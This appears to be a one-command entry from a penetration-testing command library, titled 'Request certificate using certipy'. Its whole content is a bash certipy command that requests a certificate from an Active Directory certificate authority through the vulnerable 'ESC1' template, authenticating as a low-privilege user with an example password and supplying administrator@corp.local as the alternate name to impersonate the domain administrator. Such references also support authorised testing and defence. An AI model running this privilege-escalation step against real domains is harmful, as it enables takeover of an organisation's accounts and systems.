---
id: a40d3d0e-566c-43b9-85d5-fc95f0a8e76b
name: Request certificate using certipy
type: command
executor: bash
data: certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template
  'ESC1' -alt 'administrator@corp.local'
output: null
created_at: '2023-04-06T03:56:05.732097+00:00'
updated_at: '2023-04-10T20:25:45.495574+00:00'
---

# Request certificate using certipy

```bash
certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC1' -alt 'administrator@corp.local'
```


